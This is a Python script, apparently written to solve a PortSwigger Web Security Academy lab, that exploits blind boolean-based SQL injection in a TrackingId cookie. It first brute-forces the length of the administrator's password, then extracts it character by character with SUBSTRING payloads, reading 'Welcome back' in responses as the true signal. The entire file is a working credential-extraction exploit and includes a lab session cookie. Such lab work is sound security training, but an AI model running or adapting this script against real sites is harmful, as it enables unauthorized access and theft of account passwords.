import requests as r
import string

# Send the request with the headers to the server and return the response. 

def send_request(payload):
    url = "https://0ad8000d044f1b628173a2e100a3003d.web-security-academy.net/filter?category=Pets"
    headers = {
        "Host": "0ad8000d044f1b628173a2e100a3003d.web-security-academy.net",
        "Cookie" : "TrackingId=O8HcTChGmlOkzlz8" + payload + "; session=E8NNxSIKAaVQ9FqWz2HRXIT8WbLbqt7S",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
        "Accept-Language": "fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3",   
        "Accept-Encoding": "gzip, deflate, br",
        "Referer": "https://0ad8000d044f1b628173a2e100a3003d.web-security-academy.net/",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1",
        "Priority": "u=0, i",
        "Te": "trailers"
    }

    print(headers["Cookie"])

    response = r.get(url, headers=headers)
    return response


def get_password_length():
    # brute force the password length and send back the value : 
    length = 0
    while(True):
        payload = "' AND (SELECT LENGTH(password) FROM users WHERE username = 'administrator') = " + str(length) + " -- -"
        response = send_request(payload)
        if "Welcome back" in response.text :
            return length
        else:
            length += 1

    

def main():
    # recuperation de la taille du password : 
    password_length = get_password_length() 
    # on va boucler sur l'alphabet et tester toutes les possibilités pour le mot de passe.
    password = ""
    letters = string.ascii_lowercase + string.ascii_uppercase + string.digits
    for i in range(password_length):
        for letter in letters :
            payload = "' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator')," + str(i+1) + ",1) = '" + letter + "' -- -"
            # send the request : 
            response = send_request(payload)
            # search the word Welcome in the result : 
            if "Welcome back" in response.text : 
                password += letter
                break
        
    print(f"The password is : {password}")
    print(f"His length is {len(password)}")
        
        
main()
